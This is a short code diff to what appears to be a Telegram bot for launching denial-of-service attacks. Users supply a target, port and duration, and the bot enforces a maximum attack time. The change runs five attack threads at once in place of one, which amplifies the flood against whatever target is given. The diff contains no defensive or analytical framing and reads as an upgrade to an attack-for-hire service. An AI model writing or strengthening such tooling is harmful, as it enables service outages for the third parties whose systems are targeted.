@@ -244,8 +244,14 @@ def handle_attack_details(message):
                 bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                 return
 
-            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
-            thread.start()
+            threads = []
+            for _ in range(5):  # Increase the number of threads
+                thread = Thread(target=start_attack, args=(user_id, target, port, duration))
+                threads.append(thread)
+                thread.start()
+
+            for thread in threads:
+                thread.join()  # Wait for all threads to finish
         except ValueError:
             bot.send_message(message.chat.id, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁𝗲")
     else:
@@ -298,4 +304,5 @@ if __name__ == '__main__':
             print("ConnectionError occurred. Retrying...")
         except Exception as e:
             print(f"Unexpected error: {e}")
-            time.sleep(1)
+            time.sleep(1) 
+
